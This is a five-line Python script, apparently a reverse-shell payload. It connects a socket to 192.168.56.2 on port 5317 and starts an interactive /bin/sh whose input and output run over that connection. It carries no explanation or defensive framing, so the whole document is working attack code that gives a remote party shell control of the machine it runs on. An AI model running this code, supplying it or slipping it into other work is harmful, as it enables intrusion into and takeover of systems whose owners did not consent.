import socket
import subprocess
channel = socket.socket()
channel.connect(('192.168.56.2', 5317))
subprocess.Popen(['/bin/sh', '-i'], stdin=channel, stdout=channel, stderr=channel)
